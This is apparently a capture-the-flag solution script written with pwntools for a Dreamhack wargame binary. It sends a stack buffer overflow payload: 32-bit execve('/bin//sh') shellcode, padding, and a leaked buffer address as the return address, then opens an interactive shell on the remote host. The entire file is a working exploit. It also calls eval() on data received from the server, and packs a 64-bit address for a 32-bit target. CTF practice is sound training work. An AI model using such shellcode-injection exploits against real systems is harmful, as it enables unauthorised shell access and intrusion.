from pwn import *

# p = process("./basic_exploitation_000")
p = remote("host3.dreamhack.games", 8928)
context.arch = "i386"

p.recvuntil(b"buf = ")
buf = eval(p.recvline())

shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'
# Special shellcode for scanf

payload = shellcode + b"A" * (0x80 - len(shellcode))

payload += b"BBBB"
payload += p64(buf)

p.sendline(payload)

p.interactive()